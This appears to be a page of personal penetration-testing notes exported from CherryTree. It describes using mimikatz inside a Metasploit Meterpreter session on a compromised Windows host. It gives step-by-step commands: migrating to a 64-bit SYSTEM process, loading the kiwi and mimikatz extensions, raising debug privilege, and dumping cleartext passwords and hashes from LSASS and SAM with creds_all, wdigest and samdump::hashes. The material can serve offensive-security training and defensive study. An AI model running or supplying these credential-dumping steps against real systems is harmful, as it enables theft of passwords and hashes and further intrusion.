<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>mimikatz (meterpreter)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>mimikatz (meterpreter)</h1><br /><br /><strong>
      <h3>PREREQUISITE:</h3>
    </strong><br />• SYSTEM privileges<br /><br />Site: <a
      href="https://github.com/gentilkiwi/mimikatz" target="_blank">https://github.com/gentilkiwi/mimikatz</a><br /><br /><strong>
      <h3>mimikatz(with a meterpreter shell or the standalone </h3>
    </strong><a href="https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20200816" target="_blank">.exe</a><strong>
      <h3>) created Benjamin Delpy (</h3>
    </strong><a href="https://twitter.com/gentilkiwi?lang=en" target="_blank">@gentilkiwi</a><strong>
      <h3>)</h3>
    </strong><br />Mimikatz work very similar to hashdump, search also for cleartext passwords<br />Mimikatz pulls
    authentication information from target Windows machines by scouring the memory of the LSASS process, searching for
    hashes and even cleartext passwords.<br /><br />Originally released as a separate executable (mimikatz.exe) with an
    associated DLL, the tool has been adapted into the Metasploit framework as a Meterpreter module, extending the
    functionality of the Meterpreter. The latest version of mimikatz is called Kiwi<br />In order to get the best out of
    mimikatz, it is important to have the current meterpreter session running on a 64-bit process<br /><br />1. process
    on which meterpreter is running is 32 or 64 bit<br />
    <div class="codebox">
      <div class="codebox">meterpreter&nbsp;&gt;&nbsp;sysinfo</div>
    </div><br /> ◇ <a href=""><img src="images/752-1.png" alt="images/752-1.png" /></a><br /> nothing to do because
    meterpreter is already running on a 64bit process<br /> ◇ <a href=""><img src="images/752-2.png"
        alt="images/752-2.png" /></a><br /> Because we are running on a 32 bit process, we can move to a 64 bit process
    to have the best performance from mimikatz <br /> 1.1) <span style="text-decoration:underline;">List of 64 bit
      processes</span> <br /> ▪ <div class="codebox">
      <div class="codebox">meterpreter&nbsp;&gt;&nbsp;ps&nbsp;-A&nbsp;x86_64</div>
    </div><br /> -A → filter for architecture (we want to list 64 bit processes so x86_64)<br /> ▪ <div class="codebox">
      <div class="codebox">meterpreter&nbsp;&gt;&nbsp;ps&nbsp;-A&nbsp;x86_64&nbsp;-s</div>
    </div><br /> -s → we need to move to a process with the same privileges of the current session. So if we are running
    on SYSTEM privileges we can filter for only system processes<br /> 1.2) <span
      style="text-decoration:underline;">Migrate to one of the process listed</span><br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;migrate&nbsp;[PID]<br />meterpreter&nbsp;&gt;&nbsp;getuid<br />meterpreter&nbsp;&gt;&nbsp;sysinfo
      </div>
    </div> <br />2. We can now load mimikatz on meterpreter, to do that we have 2 options (use <code>mimikatz 1.0</code>
    or <code>mimikatz 2.0</code> extensions)<br /> ◇ Meterpreter extension for <code>mimikatz 2.0</code> →
    <strong>kiwi</strong> (developed by Oliver Reeves aka <a
      href="https://twitter.com/TheColonial" target="_blank">@TheColonial</a>)<br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;load&nbsp;kiwi<br />meterpreter&nbsp;&gt;&nbsp;help&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#commands&nbsp;available&nbsp;including&nbsp;the&nbsp;ones&nbsp;of&nbsp;kiwi<br />meterpreter&nbsp;&gt;&nbsp;kiwi_cmd&nbsp;&quot;privilege::debug&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#elevate&nbsp;privilege&nbsp;to&nbsp;have&nbsp;debug&nbsp;rights<br />meterpreter&nbsp;&gt;&nbsp;kiwi_cmd&nbsp;&quot;log&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#mimikatz.log&nbsp;will&nbsp;be&nbsp;saved&nbsp;in&nbsp;the&nbsp;actual&nbsp;folder<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#of&nbsp;the&nbsp;target&nbsp;machine<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#WARNING:&nbsp;we&nbsp;are&nbsp;loving&nbsp;traces!
      </div>
    </div><br /> <a href=""><img src="images/752-3.png" alt="images/752-3.png" /></a><br /> <a href=""><img
        src="images/752-4.png" alt="images/752-4.png" /></a><br /> Now we can use the commands above, for example:<br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;creds_all&nbsp;&nbsp;#retrieve&nbsp;credentials&nbsp;from&nbsp;different&nbsp;services&nbsp;and&nbsp;protocols
      </div>
    </div><br /> we can also use the commands not directly implemented in kiwi extension of mimikatz (here
    https://github.com/gentilkiwi/mimikatz/wiki under the subchapter Modules)<br /> WARNING: <span
      style="color:#ff0000;">kiwi_cmd on meterpreter does not correctly handle commands with multiple arguments</span>
    but it handle them correctly on the normal <a href="https://github.com/gentilkiwi/mimikatz/releases/" target="_blank">mimikatz for
      Windows</a><br />
    <div class="codebox">
      <div class="codebox">meterpreter&nbsp;&gt;&nbsp;kiwi_cmd&nbsp;&quot;&lt;command&gt;&quot;</div>
    </div><br /> <span style="color:#a5452a;">example:</span><br /> <a href=""><img src="images/752-5.png"
        alt="images/752-5.png" /></a><br />
    *<code>ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061</code> means that the required privilege is
    not held by the client (mostly you&#39;re not an administrator)<br /> <a href=""><img src="images/752-6.png"
        alt="images/752-6.png" /></a><br /><br /><br /> ◇ Meterpreter extension for <code>mimikatz 1.0</code> →
    <strong>mimikatz</strong> (developed by Ben Campbell aka <a
      href="https://twitter.com/Meatballs__" target="_blank">@MeatBalls__</a>)<br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;load&nbsp;mimikatz<br />meterpreter&nbsp;&gt;&nbsp;help<br />meterpreter&nbsp;&gt;&nbsp;mimikatz_command&nbsp;-f&nbsp;&quot;privilege::debug&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#elevate&nbsp;privilege&nbsp;to&nbsp;have&nbsp;debug&nbsp;rights<br />
      </div>
    </div><br /> <a href=""><img src="images/752-7.png" alt="images/752-7.png" /></a><br /> <a href=""><img
        src="images/752-8.png" alt="images/752-8.png" /></a><br /> Now we can use the commands above, for example:<br />
    <div class="codebox">
      <div class="codebox">meterpreter&nbsp;&gt;&nbsp;wdigest</div>
    </div><br /> *To know more about Digest Authentication(<a
      href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778868(v=ws.10)" target="_blank">https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc778868(v=ws.10)</a>)<br />
    we can also use the commands not directly implemented in mimikatz extension of mimikatz (here
    https://github.com/gentilkiwi/mimikatz/wiki under the subchapter Modules)<br /> <span
      style="color:#ff0000;">WARNING: mimikatz on meterpreter does not correctly handle commands with multiple
      arguments</span> but it handle them correctly on the normal <a
      href="https://github.com/gentilkiwi/mimikatz/releases/" target="_blank">mimikatz for Windows</a><br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;mimikatz_command&nbsp;-f&nbsp;*::&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#modules&nbsp;available&nbsp;on&nbsp;mimikatz&nbsp;1.0<br />meterpreter&nbsp;&gt;&nbsp;mimikatz_command&nbsp;-f&nbsp;&lt;module&gt;::&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#query&nbsp;options&nbsp;for&nbsp;the&nbsp;module&nbsp;choosen
      </div>
    </div><br /> <span style="color:#a5452a;">example:</span><br />
    <div class="codebox">
      <div class="codebox">
        meterpreter&nbsp;&gt;&nbsp;mimikatz_command&nbsp;-f&nbsp;samdump::<br />meterpreter&nbsp;&gt;&nbsp;mimikatz_command&nbsp;-f&nbsp;&quot;samdump::hashes&quot;
      </div>
    </div><br /> <a href=""><img src="images/752-9.png" alt="images/752-9.png" /></a><br /> <br />
  </div>
</body>

</html>